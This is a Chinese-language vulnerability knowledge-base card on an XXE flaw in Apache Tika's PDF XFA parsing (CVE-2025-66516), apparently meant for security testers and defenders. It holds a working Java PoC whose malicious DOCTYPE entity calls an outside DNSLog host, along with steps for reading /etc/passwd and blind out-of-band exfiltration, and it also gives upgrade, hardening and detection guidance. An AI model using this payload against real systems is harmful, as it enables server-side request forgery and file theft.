---
id: web-generic-xxe-apache-tika-pdf-xfa-extractacroform
title: Apache Tika PDF XFA 解析 XXE：extractAcroFormContent 默认开启触发外部实体（CVE-2025-66516）
type: scenario
domain: web
path: web/generic/xxe
technique: apache-tika-pdf-xfa-xxe
tags:
- java
- apache-tika
- xxe
- pdf
- xfa
- xml
- parser
- cve-2025-66516
cve:
- CVE-2025-66516
- CVE-2025-54988
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: tika-core 1.13–3.2.1；tika-pdf-module 2.0.0–3.2.1；tika-parsers 1.13–1.28.5（3.2.2+ 修复）
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T08:54:26+08:00'
  notes: 已对照原文与11张图核对：CNA 描述 tika-core 1.13–3.2.1、tika-pdf-module 2.0.0–3.2.1、tika-parsers 1.13–1.28.5、CVE-2025-66516 与 CVE-2025-54988 同源、tika-core 需升级 3.2.2+；parseToString→DefaultParser→PDFParser→PDF2XHTML.process→writeText→endDocument→extractAcroFormContent(默认 true)→extractAcroForm→XFAExtractor.extract→reader.next 调用链与源码截图一致；PDFBox 构造 /XFA COSStream 的 PoC 与原文代码一致，图11 DNSLog 37725x.dnslog.cn 回调 2025-12-08 20:05:18 证明 XXE 已打通。原文仅验证 DNS OOB，文件读取/SSRF 为 XXE 通用延伸、卡内已作变体说明；PoC 未本机执行。affected_versions 已按原文三个 artifact 区间设置；frontmatter 无 sources/source_url。
url: /docs/web/generic/xxe/web-generic-xxe-apache-tika-pdf-xfa-extractacroform/
draft: false
kb_aliases:
- CVE-2025-66516
- CVE-2025-54988
- Apache Tika XXE
- Tika PDF XFA XXE
- XFAExtractor XXE
- extractAcroFormContent
- Tika XFA 外部实体
---

## 一句话结论

Apache Tika 在默认配置下会解析 PDF 中的 XFA 表单，而 `XFAExtractor` 使用未加固的 `XMLReaderUtils.getXMLInputFactory(context).createXMLStreamReader()` 解析 XFA XML；攻击者在 PDF 的 AcroForm 中嵌入带恶意 DOCTYPE 的 XFA 流，Tika 解析时即触发 XXE，可发起服务端请求（DNS/HTTP OOB）或读取本地文件。

## 原理

- **解析链**：
  - 应用调用 `new Tika().parseToString(file)` → `Tika.parseToString` 内部 `parser.parse(stream, ...)`。
  - `DefaultParser` 按 Content-Type 选择 `PDFParser`；PDF 含 XFA 时进入 `PDF2XHTML.process(document, handler, context, metadata, config)`。
  - `PDF2XHTML.writeText` 在解析完全部页面后调用 `endDocument(pdf)`：
    ```java
    this.extractXMPXFA(pdf, this.metadata, this.context);
    if (this.config.isExtractAcroFormContent()) {
        this.extractAcroForm(pdf);
    }
    ```
  - `extractAcroForm` 取 `catalog.getAcroForm().getXFA()` 的字节流，交给 `XFAExtractor.extract(is, xhtml, metadata, context)`。
  - `XFAExtractor.extract` 调用 `XMLReaderUtils.getXMLInputFactory(context).createXMLStreamReader(xfaIs)`，随后 `reader.next()` 触发 XML 解析。
- **脆弱点**：`extractAcroFormContent` 默认值为 `true`，即默认会解析 PDF 内嵌 XFA；Tika 的 `XMLInputFactory` 未禁用 DTD/外部实体（未设置 `SUPPORT_DTD=false`、`IS_SUPPORTING_EXTERNAL_ENTITIES=false` 等），因此 XFA 中的 `<!DOCTYPE ... <!ENTITY xxe SYSTEM "http://...">` 会被解析并尝试加载。
- **为什么攻击者能控制 XFA**：XFA 是 PDF AcroForm 里的 XML 流（`/XFA`），PDF 由用户上传/提交时完全可控；攻击者可用 PDFBox 创建 `COSStream` 写入恶意 XML，再 `acroFormDict.setItem(COSName.XFA, xfaStream)`，保存为 PDF 即可。
- **与 CVE-2025-54988 的关系**：本 CVE 与 CVE-2025-54988 根因相同，但扩大了受影响包范围：修复位于 `tika-core`，只升级 `tika-pdf-module` 而不升级 `tika-core` 仍会受影响；1.x 的 `PDFParser` 位于 `tika-parsers` 模块。
- **影响**：XXE 可做 OOB 探测（DNS/HTTP 回调确认解析）、SSRF 请求内网、以及在实体内容进入解析输出/元数据时读取本地文件（`file://`）。CVSS 4.0 评分 10.0。

## 触发条件

- 目标使用受影响版本：`tika-core` 1.13–3.2.1、`tika-pdf-module` 2.0.0–3.2.1 或 `tika-parsers` 1.13–1.28.5。
- 应用用 Tika 解析用户可控的 PDF（上传、预览、内容提取、文档转换等），且使用默认配置（`extractAcroFormContent=true`）。
- Tika 进程可发起外连（DNS/HTTP）或读取目标文件；OOB 利用还需要攻击者可控的回连域名/服务器。
- 目标未在 XML 解析层禁用 DTD/外部实体，也未关闭 XFA 解析。

## 利用步骤

1. 确认目标使用 Tika 解析 PDF：上传正常 PDF 观察是否被转换为文本/预览/元数据。
2. 用 PDFBox 构造含 XFA 的 PDF：创建 `PDAcroForm`，把恶意 XML 写入 `COSStream`，设置到 `COSName.XFA`。
3. 恶意 XFA 使用外部实体指向 DNSLog/HTTP 回调地址；先验证 OOB 是否触发。
4. 若需要读文件，把实体改为 `file:///etc/passwd`，并让实体内容进入 XFA data/文本输出（或结合报错/元数据回显）；盲场景可用 OOB 参数实体外带。
5. 将 PDF 上传/提交给目标解析接口，观察 DNS/HTTP 回调或输出内容。
6. 不要在生产环境读取敏感文件；用无害文件验证。

## PoC

```java
package org.example;

import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.interactive.form.PDAcroForm;
import org.apache.pdfbox.cos.COSDictionary;
import org.apache.pdfbox.cos.COSStream;
import org.apache.pdfbox.cos.COSName;

import java.io.OutputStream;

public class XFAPoC {
    public static void main(String[] args) throws Exception {
        PDDocument doc = new PDDocument();
        doc.addPage(new PDPage());

        PDAcroForm acroForm = new PDAcroForm(doc);
        acroForm.setNeedAppearances(true);
        doc.getDocumentCatalog().setAcroForm(acroForm);

        String xfaXml =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE xfa [\n" +
            "  <!ENTITY xxe SYSTEM \"http://37725x.dnslog.cn\">\n" +
            "]>\n" +
            "<xfa xmlns=\"http://www.xfa.org/schema/xfa-data/1.0/\">\n" +
            "  <data>&xxe;</data>\n" +
            "</xfa>";

        COSStream xfaStream = doc.getDocument().createCOSStream();
        try (OutputStream os = xfaStream.createOutputStream()) {
            os.write(xfaXml.getBytes("UTF-8"));
        }
        COSDictionary acroFormDict = acroForm.getCOSObject();
        acroFormDict.setItem(COSName.XFA, xfaStream);

        doc.save("1.pdf");
        doc.close();
    }
}
```

触发解析：

```java
Tika tika = new Tika();
String txt = tika.parseToString(new File("1.pdf"));
System.out.println(txt);
```

说明：DNSLog 中出现 `<随机子域>.dnslog.cn` 查询即证明 XXE 成立；读取本地文件可将 `SYSTEM "http://..."` 换成 `SYSTEM "file:///etc/passwd"` 并观察输出/元数据。PoC 依据原文构造，未在本会话执行。

## 变体与关联

- **盲 XXE 外带**：参数实体 + 外部 DTD 把文件内容拼进请求路径/查询串；适合无回显的解析接口。
- **文件读取**：`file://` 实体；若实体值只进入未输出的 XFA 字段，需要找会回显 data 字段/元数据的解析路径。
- **触发方法变体**：`parseToString`、`parse`、`AutoDetectParser`、批量文档索引/预览服务都可能走到 `PDFParser`；只要默认 `extractAcroFormContent` 开启即可。
- **组件范围**：`tika-core` 修复不一定覆盖 1.x 的 `tika-parsers` 中的 `PDFParser`；升级时三个 artifact 都要检查。
- 关联：[[web-generic-xxe-inband-file-read-default-insecure]]（Java XML 解析器默认允许外部实体的有回显读取）；[[web-generic-xxe-oob-exfil]]（盲 XXE OOB 外带）；[[web-java-xxe-nacos-spring-context-config-parse]]（另一 Java 组件的 XXE）。

## 检测与防御

- **升级**：升级 `tika-core` 到 3.2.2+，并同步升级 `tika-pdf-module`/`tika-parsers`；只升级 PDF 模块不能修复。
- **配置**：如不需要 XFA，设置 `PDFParserConfig.setExtractAcroFormContent(false)`；在 `XMLInputFactory` 上禁用 DTD 与外部实体（`SUPPORT_DTD=false`、`IS_SUPPORTING_EXTERNAL_ENTITIES=false`、`XMLConstants.FEATURE_SECURE_PROCESSING=true`）；Tika 3.x 可通过 `XMLReaderUtils` 的加固配置统一处理。
- **架构**：文档解析服务放在隔离容器/低权限用户，限制出站网络；对上传 PDF 做 `/XFA` 与 DOCTYPE 检测；解析超时与资源限制。
- **检测特征**：PDF 内含 `/XFA` 流且 XML 出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、外部 URL；解析进程发起异常 DNS/HTTP 请求；文档解析服务访问内网地址；返回文本/元数据中出现系统文件内容。
- **应急**：确认解析服务是否发起过可疑外连/读取敏感文件；限制出站；升级后回归 PDF 解析功能。
